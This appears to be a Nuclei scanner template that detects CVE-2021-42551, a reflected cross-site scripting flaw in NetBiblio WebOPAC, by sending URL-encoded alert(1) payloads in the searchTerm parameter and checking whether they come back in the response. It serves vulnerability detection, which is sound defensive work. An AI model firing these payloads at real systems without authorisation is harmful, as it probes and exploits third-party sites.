http:
- host-redirects: true
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - 'SearchTerm: ''x''+alert(1)+''x'','
    - 'SearchTerm: ''x\\''+alert(1),//'','
  - part: header
    type: word
    words:
    - text/html
  - part: body
    type: word
    words:
    - NetBiblio
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%27%2Balert%281%29%2B%27x'
  - '{{BaseURL}}/NetBiblio/search/shortview?searchField=W&searchType=Simple&searchTerm=x%5C%27%2Balert%281%29%2C%2F%2F'
id: CVE-2021-42551
info:
  author: compr00t
  classification:
    cpe: cpe:2.3:a:alcoda:netbiblio:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-42551
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.92583
    epss-score: 0.09561
  description: NetBiblio WebOPAC before 4.0.0.320 is affected by a reflected cross-site
    scripting vulnerability in its Wikipedia module through /NetBiblio/search/shortview
    via the searchTerm parameter.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 2
    product: netbiblio
    vendor: alcoda
  name: NetBiblio WebOPAC - Cross-Site Scripting
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-42551
  - https://www.redguard.ch/advisories/netbiblio_webopac.txt
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/compr00t/nuclei-templates
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: medium
  tags: cve2021,cve,xss,netbiblio,alcoda,vuln
